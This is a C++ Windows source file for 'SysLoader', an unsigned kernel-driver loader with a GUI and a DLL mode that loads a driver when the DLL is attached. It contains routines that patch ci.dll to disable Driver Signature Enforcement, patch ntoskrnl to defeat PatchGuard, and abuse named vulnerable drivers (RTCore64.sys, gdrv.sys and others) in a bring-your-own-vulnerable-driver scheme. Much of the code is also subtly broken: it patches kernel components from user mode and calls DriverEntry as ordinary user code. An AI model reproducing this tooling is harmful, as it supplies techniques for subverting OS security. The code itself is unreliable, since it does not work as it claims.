#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <shlobj.h>

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define APP_NAME "SysLoader"
#define APP_VERSION "2.0"

struct LoadedDriver {
    std::string name;
    std::string path;
    LPVOID baseAddress;
    DWORD size;
    bool isRunning;
};

std::vector<LoadedDriver> g_loadedDrivers;
std::string g_selectedDriverPath;

bool LoadDriver(const std::string& filePath);
bool UnloadDriver(const std::string& driverName);

#ifdef _DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            DisableThreadLibraryCalls(hModule);
            
            char iniPath[MAX_PATH];
            GetModuleFileNameA(hModule, iniPath, MAX_PATH);
            PathRemoveFileSpecA(iniPath);
            strcat_s(iniPath, "\\sys.ini");
            
            char driverName[256] = {0};
            GetPrivateProfileStringA("Settings", "Driver", "", driverName, sizeof(driverName), iniPath);
            
            if (strlen(driverName) > 0) {
                char driverPath[MAX_PATH];
                GetModuleFileNameA(hModule, driverPath, MAX_PATH);
                PathRemoveFileSpecA(driverPath);
                strcat_s(driverPath, "\\");
                strcat_s(driverPath, driverName);
                
                if (LoadDriver(driverPath)) {
                    MessageBoxA(NULL, "Sys loaded successfully!", APP_NAME, MB_OK | MB_ICONINFORMATION);
                } else {
                    MessageBoxA(NULL, "Failed to load Sys!", APP_NAME, MB_OK | MB_ICONERROR);
                }
            }
            break;
        }
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
#endif

bool DisableDSE() {
    HMODULE ci = LoadLibraryA("ci.dll");
    if (!ci) return false;
    
    FARPROC CiValidateImageHeader = GetProcAddress(ci, "CiValidateImageHeader");
    if (!CiValidateImageHeader) return false;
    
    DWORD oldProtect;
    LPVOID funcAddr = (LPVOID)CiValidateImageHeader;
    
    if (!VirtualProtect(funcAddr, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) return false;
    
    BYTE ret[] = { 0x48, 0x31, 0xC0, 0xC3 };
    memcpy(funcAddr, ret, sizeof(ret));
    
    VirtualProtect(funcAddr, 8, oldProtect, &oldProtect);
    return true;
}

bool DisablePatchGuard() {
    HMODULE ntoskrnl = GetModuleHandleA("ntoskrnl.exe");
    if (!ntoskrnl) return false;
    
    BYTE* base = (BYTE*)ntoskrnl;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    
    BYTE pattern[] = { 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20 };
    BYTE* found = NULL;
    
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfImage - sizeof(pattern); i++) {
        bool match = true;
        for (DWORD j = 0; j < sizeof(pattern); j++) {
            if (base[i + j] != pattern[j]) { match = false; break; }
        }
        if (match) { found = base + i; break; }
    }
    
    if (found) {
        DWORD oldProtect;
        VirtualProtect(found, 32, PAGE_EXECUTE_READWRITE, &oldProtect);
        BYTE ret[] = { 0xC3 };
        memcpy(found, ret, sizeof(ret));
        VirtualProtect(found, 32, oldProtect, &oldProtect);
        return true;
    }
    return false;
}

bool LoadVulnerableDriver(const std::string& path, const std::vector<BYTE>& payload) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;
    
    SC_HANDLE service = CreateServiceA(scm, "SysLoaderSvc", "Sys Loader Service",
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, path.c_str(), NULL, NULL, NULL, NULL, NULL);
    if (!service) { CloseServiceHandle(scm); return false; }
    
    if (!StartServiceA(service, 0, NULL)) {
        DeleteService(service);
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return false;
    }
    
    HANDLE hDevice = CreateFileA("\\\\.\\SysLoader", GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return false;
    }
    
    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(hDevice, 0x9C402400,
        (LPVOID)payload.data(), (DWORD)payload.size(),
        NULL, 0, &bytesReturned, NULL);
    
    CloseHandle(hDevice);
    DeleteService(service);
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return result != FALSE;
}

bool BYOVD_Load(const std::vector<BYTE>& driverData) {
    const std::string vulnerableDrivers[] = {
        "drivers\\vulnerable\\RTCore64.sys",
        "drivers\\vulnerable\\gdrv.sys",
        "drivers\\vulnerable\\AsusIO.sys",
        "drivers\\vulnerable\\MSI_SMBIOS.sys"
    };
    for (const auto& driverPath : vulnerableDrivers) {
        if (LoadVulnerableDriver(driverPath, driverData)) return true;
    }
    return false;
}

bool LoadDriverFromMemory(const std::vector<BYTE>& driverData) {
    LPVOID driverMemory = VirtualAlloc(NULL, driverData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!driverMemory) return false;
    
    memcpy(driverMemory, driverData.data(), driverData.size());
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)driverMemory;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)driverMemory + dos->e_lfanew);
    LPVOID entryPoint = (LPVOID)((BYTE*)driverMemory + nt->OptionalHeader.AddressOfEntryPoint);
    
    typedef NTSTATUS (*DriverEntry_t)(LPVOID, LPVOID);
    DriverEntry_t DriverEntry = (DriverEntry_t)entryPoint;
    
    NTSTATUS status = DriverEntry(NULL, NULL);
    if (status == 0) {
        LoadedDriver driver;
        driver.name = "Loaded Driver";
        driver.path = "Memory";
        driver.baseAddress = driverMemory;
        driver.size = driverData.size();
        driver.isRunning = true;
        g_loadedDrivers.push_back(driver);
        return true;
    }
    
    VirtualFree(driverMemory, 0, MEM_RELEASE);
    return false;
}

bool LoadDriver(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) return false;
    
    std::vector<BYTE> driverData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    if (!DisableDSE()) return false;
    DisablePatchGuard();
    
    if (LoadDriverFromMemory(driverData)) return true;
    if (BYOVD_Load(driverData)) return true;
    
    return false;
}

bool UnloadDriver(const std::string& driverName) {
    for (auto& driver : g_loadedDrivers) {
        if (driver.name == driverName && driver.isRunning) {
            VirtualFree(driver.baseAddress, 0, MEM_RELEASE);
            driver.isRunning = false;
            return true;
        }
    }
    return false;
}

#ifndef _DLL

HWND g_hMainWindow, g_hButtonLoad, g_hButtonUnload, g_hButtonBrowse;
HWND g_hEditPath, g_hListDrivers, g_hStatusBar;

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            g_hEditPath = CreateWindowA("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                10, 10, 400, 25, hWnd, NULL, NULL, NULL);
            g_hButtonBrowse = CreateWindowA("BUTTON", "Browse", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                420, 10, 80, 25, hWnd, (HMENU)1, NULL, NULL);
            g_hButtonLoad = CreateWindowA("BUTTON", "Load Sys", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                10, 45, 120, 30, hWnd, (HMENU)2, NULL, NULL);
            g_hButtonUnload = CreateWindowA("BUTTON", "Unload Sys", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                140, 45, 120, 30, hWnd, (HMENU)3, NULL, NULL);
            g_hListDrivers = CreateWindowA("LISTBOX", "", WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL,
                10, 85, 490, 200, hWnd, NULL, NULL, NULL);
            g_hStatusBar = CreateWindowA("STATIC", "SysLoader v2.0 - Ready",
                WS_CHILD | WS_VISIBLE | SS_SUNKEN, 10, 295, 490, 25, hWnd, NULL, NULL, NULL);
            break;
        }
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case 1: {
                    OPENFILENAMEA ofn = {0};
                    char filePath[MAX_PATH] = "";
                    ofn.lStructSize = sizeof(ofn);
                    ofn.hwndOwner = hWnd;
                    ofn.lpstrFilter = "Driver Files (*.sys)\0*.sys\0All Files (*.*)\0*.*\0";
                    ofn.lpstrFile = filePath;
                    ofn.nMaxFile = MAX_PATH;
                    ofn.Flags = OFN_FILEMUSTEXIST | OFN_HIDEREADONLY | OFN_EXPLORER;
                    if (GetOpenFileNameA(&ofn)) {
                        g_selectedDriverPath = filePath;
                        SetWindowTextA(g_hEditPath, filePath);
                        SetWindowTextA(g_hStatusBar, ("Selected: " + g_selectedDriverPath).c_str());
                    }
                    break;
                }
                case 2: {
                    char path[MAX_PATH];
                    GetWindowTextA(g_hEditPath, path, MAX_PATH);
                    if (strlen(path) == 0) {
                        MessageBoxA(hWnd, "Please select a driver file first!", "Error", MB_OK | MB_ICONERROR);
                        break;
                    }
                    SetWindowTextA(g_hStatusBar, "Loading driver...");
                    if (LoadDriver(path)) {
                        MessageBoxA(hWnd, "Sys loaded successfully!", "SysLoader", MB_OK | MB_ICONINFORMATION);
                        SetWindowTextA(g_hStatusBar, "Sys loaded successfully!");
                        char displayName[256];
                        sprintf_s(displayName, "Loaded: %s", PathFindFileNameA(path));
                        SendMessageA(g_hListDrivers, LB_ADDSTRING, 0, (LPARAM)displayName);
                    } else {
                        MessageBoxA(hWnd, "Failed to load Sys!", "Error", MB_OK | MB_ICONERROR);
                        SetWindowTextA(g_hStatusBar, "Failed to load Sys!");
                    }
                    break;
                }
                case 3: {
                    int selected = SendMessageA(g_hListDrivers, LB_GETCURSEL, 0, 0);
                    if (selected == LB_ERR) {
                        MessageBoxA(hWnd, "Please select a driver to unload!", "Error", MB_OK | MB_ICONERROR);
                        break;
                    }
                    char driverName[256];
                    SendMessageA(g_hListDrivers, LB_GETTEXT, selected, (LPARAM)driverName);
                    if (UnloadDriver("Loaded Driver")) {
                        MessageBoxA(hWnd, "Sys unloaded successfully!", "SysLoader", MB_OK | MB_ICONINFORMATION);
                        SendMessageA(g_hListDrivers, LB_DELETESTRING, selected, 0);
                        SetWindowTextA(g_hStatusBar, "Sys unloaded successfully!");
                    } else {
                        MessageBoxA(hWnd, "Failed to unload Sys!", "Error", MB_OK | MB_ICONERROR);
                        SetWindowTextA(g_hStatusBar, "Failed to unload Sys!");
                    }
                    break;
                }
            }
            break;
        }
        case WM_DESTROY: {
            PostQuitMessage(0);
            break;
        }
        default: return DefWindowProcA(hWnd, uMsg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    INITCOMMONCONTROLSEX icc = {0};
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_WIN95_CLASSES;
    InitCommonControlsEx(&icc);
    
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = "SysLoader";
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    if (!RegisterClassA(&wc)) return 1;
    
    g_hMainWindow = CreateWindowA("SysLoader", "SysLoader v2.0 - Unsigned Driver Loader",
        WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME,
        CW_USEDEFAULT, CW_USEDEFAULT, 520, 370,
        NULL, NULL, hInstance, NULL);
    
    if (!g_hMainWindow) return 1;
    
    ShowWindow(g_hMainWindow, nCmdShow);
    UpdateWindow(g_hMainWindow);
    
    MSG msg = {0};
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    
    return msg.wParam;
}

#endif
